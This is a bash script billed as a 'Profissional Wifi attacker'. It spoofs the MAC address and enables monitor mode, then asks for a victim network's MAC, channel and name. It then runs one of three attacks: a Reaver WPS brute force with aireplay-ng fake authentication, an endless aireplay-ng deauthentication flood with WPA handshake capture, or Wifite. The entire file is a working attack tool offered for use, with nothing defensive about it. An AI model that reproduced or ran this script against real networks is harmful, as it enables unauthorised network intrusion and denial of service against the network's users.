#!/bin/bash
# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White
echo -e "\e[1m\e[32m##############################################################"
echo -e "\e[1m\e[32m#################                            #################"
echo -e "\e[1m\e[32m#####            Profissional Wifi attacker              #####" 
echo -e "\e[1m\e[32m#################                            #################"
echo -e "\e[1m\e[32m##############################################################"
echo ''
echo -e "\e[1;34mWifi-Attacker"
echo ''
sleep 2
echo -e "$Cyan"
airmon-ng stop wlan0mon
airmon-ng stop wlan0
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
airmon-ng start wlan0
ifconfig  wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up
echo -e "[\] changed Mac-adress Done"
sleep 1
echo -e "$Yellow"
airodump-ng wlan0mon
echo -e "\e[1m\e[32m Happy hunt!!"
read -p "what is the vicims Mac-adress: " Mac
read -p "what is the vicims Chaneel: " Ch
read -p "what is the vicims Name: " Name
iwconfig wlan0mon channel $Ch
echo -e "$BBlue"
read -p "whats the type of attack you choose: 
[1]reaver
[2]aireplay-ng
[3]wifite
: " Attack

if [ $Attack -eq 1 ]
then
echo ''
echo -e "$Red===================================================================="
echo -e "$Green                          Reaver-Attack                           "
echo -e "$Red===================================================================="
echo -e '\e[1;33m'
xterm -e  timeout 3000h aireplay-ng -1 10  -a $Mac -x 100 wlan0mon &
reaver -i wlan0mon -b $Mac -c $Ch -vv --no-nacks 



sleep 3 
fi 
if [ $Attack -eq 2 ]
then
echo ''
echo -e "$Red===================================================================="
echo -e "$Green                          Handshak-Attack                         "
echo -e "$Red===================================================================="
xterm -T Death-Attack -e timeout  3000h aireplay-ng -0 0 -a  $Mac  wlan0mon &
airodump-ng --bssid  $Mac  -c $Ch -w /root/handshake/$Name wlan0mon 
sleep 3 
fi
if [ $Attack -eq 3 ]
then
echo ''
echo -e "$Red===================================================================="
echo -e "$Green                           Wifite                                 "
echo -e "$Red===================================================================="
wifite
fi
echo ""
if [ $? -eq 0 -a 1 ]
then
echo ''
echo -e "$Red##############################################################"
echo -e "$Red#####################                #########################"
echo -e "$Red#####################  END OF SCRIPT #########################" 
echo -e "$Red#####################                #########################"
echo -e "$Red##############################################################"
echo -e "$Yellow This Script done by Ahmad Jawabreh"
echo -e "$Yellow Have a nice day :)"
echo -e "$Yellow GoodBye"
exit
fi

